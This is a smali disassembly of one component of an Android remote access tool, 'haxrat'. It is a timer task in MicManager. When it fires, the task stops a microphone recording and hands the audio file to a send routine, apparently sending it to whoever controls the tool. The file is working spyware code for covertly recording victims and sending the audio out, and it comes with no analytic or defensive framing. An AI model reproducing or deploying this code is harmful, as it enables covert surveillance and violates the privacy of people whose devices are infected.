.class Lcom/hax4us/haxrat/MicManager$100000000;
.super Ljava/util/TimerTask;
.source "MicManager.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/hax4us/haxrat/MicManager;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000000"
.end annotation


# direct methods
.method constructor <init>()V
    .locals 3

    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 56
    move-object v0, p0

    sget-object v2, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->stop()V

    .line 57
    sget-object v2, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->release()V

    .line 58
    const-string v2, "MI"

    sget-object v3, Lcom/hax4us/haxrat/MicManager;->audiofile:Ljava/io/File;

    invoke-static {v2, v3}, Lcom/util/extras/Utils;->send(Ljava/lang/String;Ljava/io/File;)Z

    move-result v2

    return-void
.end method
